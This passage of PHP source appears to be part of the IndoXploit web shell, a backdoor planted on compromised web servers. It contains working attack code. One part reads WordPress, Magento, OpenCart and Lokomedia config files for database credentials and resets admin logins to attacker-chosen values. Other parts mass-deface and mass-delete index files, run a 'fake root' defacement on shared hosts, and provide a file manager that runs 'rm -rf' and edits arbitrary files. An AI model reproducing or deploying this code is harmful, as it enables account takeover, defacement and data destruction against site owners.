							else {
								print "Sitename => $site<br>";
							}
							if(!$update OR !$conn OR !$db) {
								print "Status => ".color(1, 1, mysql_error())."<br><br>";
							} 
							else {
								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
							}
							mysql_close($conn);
						} elseif(preg_match("/WordPress/",$config)) {
							$dbhost = getValue($config,"DB_HOST', '","'");
							$dbuser = getValue($config,"DB_USER', '","'");
							$dbpass = getValue($config,"DB_PASSWORD', '","'");
							$dbname = getValue($config,"DB_NAME', '","'");
							$dbprefix = getValue($config,"table_prefix  = '","'");
							$prefix = $dbprefix."users";
							$option = $dbprefix."options";
							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[ID];
							$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
							$result2 = mysql_fetch_array($q2);
							$target = $result2[option_value];
							if($target == '') {
								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
							} 
							else {
								$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
							}
							$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
							print "Config => ".$file_conf."<br>";
							print "CMS => Wordpress<br>";
							print $url_target;
							if(!$update OR !$conn OR !$db) {
								print "Status => ".color(1, 1, mysql_error())."<br><br>";
							} 
							else {
								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
							}
							mysql_close($conn);
						} 
						elseif(preg_match("/Magento|Mage_Core/",$config)) {
							$dbhost = getValue($config,"<host><![CDATA[","]]></host>");
							$dbuser = getValue($config,"<username><![CDATA[","]]></username>");
							$dbpass = getValue($config,"<password><![CDATA[","]]></password>");
							$dbname = getValue($config,"<dbname><![CDATA[","]]></dbname>");
							$dbprefix = getValue($config,"<table_prefix><![CDATA[","]]></table_prefix>");
							$prefix = $dbprefix."admin_user";
							$option = $dbprefix."core_config_data";
							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[user_id];
							$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
							$result2 = mysql_fetch_array($q2);
							$target = $result2[value];
							if($target == '') {
								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
							} 
							else {
								$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
							print "Config => ".$file_conf."<br>";
							print "CMS => Magento<br>";
							print $url_target;
							if(!$update OR !$conn OR !$db) {
								print "Status => ".color(1, 1, mysql_error())."<br><br>";
							} 
							else {
								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
							}
							mysql_close($conn);
						} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
							$dbhost = getValue($config,"'DB_HOSTNAME', '","'");
							$dbuser = getValue($config,"'DB_USERNAME', '","'");
							$dbpass = getValue($config,"'DB_PASSWORD', '","'");
							$dbname = getValue($config,"'DB_DATABASE', '","'");
							$dbprefix = getValue($config,"'DB_PREFIX', '","'");
							$prefix = $dbprefix."user";
							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[user_id];
							$target = getValue($config,"HTTP_SERVER', '","'");
							if($target == '') {
								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
							} 
							else {
								$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
							print "Config => ".$file_conf."<br>";
							print "CMS => OpenCart<br>";
							print $url_target;
							if(!$update OR !$conn OR !$db) {
								print "Status => ".color(1, 1, mysql_error())."<br><br>";
							} 
							else {
								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
							}
							mysql_close($conn);
						} 
						elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
							$dbhost = getValue($config,'server = "','"');
							$dbuser = getValue($config,'username = "','"');
							$dbpass = getValue($config,'password = "','"');
							$dbname = getValue($config,'database = "','"');
							$prefix = "users";
							$option = "identitas";
							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
							$result = mysql_fetch_array($q);
							$target = $result[alamat_website];
							if($target == '') {
								$target2 = $result[url];
								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
								if($target2 == '') {
									$url_target2 = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
								} 
								else {
									$cek_login3 = file_get_contents("$target2/adminweb/");
									$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
									if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
										$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
									} 
									elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
										$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
									} 
									else {
										$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
									}
								}
							} else {
								$cek_login = file_get_contents("$target/adminweb/");
								$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
								if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
									$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
								} 
								elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
									$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
								} 
								else {
									$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
								}
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
							print "Config => ".$file_conf."<br>";
							print "CMS => Lokomedia<br>";
							if(preg_match("/Can't get domain name/", $url_target)) {
								print $url_target2;
							} 
							else {
								print $url_target;
							}
							if(!$update OR !$conn OR !$db) {
								print "Status => ".color(1, 1, mysql_error())."<br><br>";
							} 
							else {
								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
							}
							mysql_close($conn);
						}
					}
				}
			} 
			else {
				print "<center>
				<h1>Mass Password Change</h1>
				<form method='post'>
				<input type='radio' name='config_type' value='dir' checked>DIR Config<input type='radio' name='config_type' value='link'>LINK Config<br>
				<input type='text' size='50' name='config_dir' value='".path()."'><br><br>
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='indoxploit' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='indoxploit' placeholder='pass_baru'><br>
				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
				</form></center>";
			}
		}
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				if($_POST['mass_type'] === 'singledir') {
					print "<div style='margin: 5px auto; padding: 5px'>";
					massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file']);
					print "</div>";
				} 
				elseif($_POST['mass_type'] === 'alldir') {
					print "<div style='margin: 5px auto; padding: 5px'>";
					massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file'], "-alldir");
					print "</div>";
				}
				elseif($_POST['mass_type'] === "delete") {
					print "<div style='margin: 5px auto; padding: 5px'>";
					massdelete($_POST['d_dir'], $_POST['d_file']);
					print "</div>";
				}
			} 
			else {
				print "<center><form method='post'>
					   <font style='text-decoration: underline;'>Tipe Sabun:</font><br>
					   <input type='radio' name='mass_type' value='singledir' checked>Mass Deface Single Directory<input type='radio' name='mass_type' value='alldir'>Mass Deface All Directory<input type='radio' name='mass_type' value='delete'>Mass Delete File<br>
					   <span>( kosongkan 'Index File' jika memilih Mass Delete File )</span><br><br>
					   <font style='text-decoration: underline;'>Folder:</font><br>
					   <input type='text' name='d_dir' value='".path()."' style='width: 450px;' height='10'><br><br>
					   <font style='text-decoration: underline;'>Filename:</font><br>
					   <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
					   <font style='text-decoration: underline;'>Index File:</font><br>
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by IndoXploit</textarea><br>
					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
					   </form></center>";
			}
		}
		elseif($_GET['do'] == 'fakeroot') {
			ob_start();

			$site = explode("\r\n", $_POST['url']);
			$user = usergroup()->name;
			$file = $_POST['file'];

			if(!preg_match("#/home/$user/public_html#", $_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "I think this server not using shared host :("));
			
			
			if($_POST['reverse']) {
				if(!is_writable($_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "Directory '".$_SERVER['DOCUMENT_ROOT']."' is not writeable."));
				if(!is_writable(dirname($_SERVER['DOCUMENT_ROOT']))) die(color(1, 1, "Directory '".dirname($_SERVER['DOCUMENT_ROOT'])."' is not writeable."));

				save($_SERVER['DOCUMENT_ROOT']."/".$file, "w", $_POST['script']);
				save(dirname($_SERVER['DOCUMENT_ROOT'])."/".$file, "w", $_POST['script']);

				foreach($site as $url) {
					$cek = curl("$url/~$user/$file")['response'];
					if(preg_match("/hacked/i", $cek)) {
						print "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
					}
				}
			} else {
				print "<center><form method='post'>
				Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
				User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
				Domain: <br>
				<textarea style='width: 450px; height: 250px;' name='url'>";
				print implode("\n", reverse());
				print "</textarea><br>
				<font style='text-decoration: underline;'>Index File:</font><br>
				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by IndoXploit</textarea><br>
				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='reverse' value='Scan Fake Root!'>
				</form><br>
				NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
			}
		} 
	}
	elseif(isset($_GET['act'])) {
		if($_GET['act'] === 'newfile') {
			if($_POST['save']) {
				$filename = htmlspecialchars($_POST['filename']);
				$fopen    = fopen($filename, "a+");
				if($fopen) {
					$act = "<script>window.location='?act=edit&dir=".path()."&file=".$_POST['filename']."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			}
			print $act;
			print "<form method='post'>
			Filename: <input type='text' name='filename' value='".path()."/newfile.php' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='SUBMIT'>
			</form>";
		} 
		elseif($_GET['act'] === 'newfolder') {
			if($_POST['save']) {
				$foldername = path().'/'.htmlspecialchars($_POST['foldername']);
				if(!@mkdir($foldername)) {
					$act = color(1, 1, "Permission Denied!");
				} 
				else {
					$act = "<script>window.location='?dir=".path()."';</script>";
				}
			}
			print $act;
			print "<form method='post'>
			Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='SUBMIT'>
			</form>";
		} 
		elseif($_GET['act'] === 'rename_folder') {
			if($_POST['save']) {
				$rename_folder = rename(path(), "".dirname(path()).DIRECTORY_SEPARATOR.htmlspecialchars($_POST['foldername']));
				if($rename_folder) {
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
			print "$act<br>";
			}
			print "<form method='post'>
			<input type='text' value='".basename(path())."' name='foldername' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
		} 
		elseif($_GET['act'] === 'delete_folder') {
			if(is_dir(path())) {
				if(is_writable(path())) {
					@rmdir(path());
					if(!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf ".path());
					if(!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q ".path());
					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
				} 
				else {
					$act = color(1, 1, "Could not remove directory '".basename(path())."'");
				}
			}
			print $act;
		} 
		elseif($_GET['act'] === 'view') {
			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
		} 
		elseif($_GET['act'] === 'edit') {
			if($_POST['save']) {
				$save = file_put_contents($_GET['file'], $_POST['src']);
				if($save) {
					$act = color(1, 2, "File Saved!");
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
				print "$act<br>";
			}

			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<form method='post'>
			<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
			<input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
			</form>";
		} 
		elseif($_GET['act'] === 'rename') {
			if($_POST['save']) {
				$rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars($_POST['filename']));
				if($rename) {
					$act = "<script>window.location='?dir=".path()."';</script>";
				} 
				else {
					$act = color(1, 1, "Permission Denied!");
				}
				print "$act<br>";
			}

			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
			print "<form method='post'>
			<input type='text' value='".basename($_GET['file'])."' name='filename' style='width: 450px;' height='10'>
			<input type='submit' class='input' name='save' value='RENAME'>
			</form>";
		}
		elseif($_GET['act'] === 'delete') {
			$delete = unlink($_GET['file']);
			if($delete) {
				$act = "<script>window.location='?dir=".path()."';</script>";
			} 
			else {
				$act = color(1, 1, "Permission Denied!");
			}
			print $act;
		}
	}
	else {
		files_and_folder();
	}
}

serverinfo();
action();
?>
</body>
</html>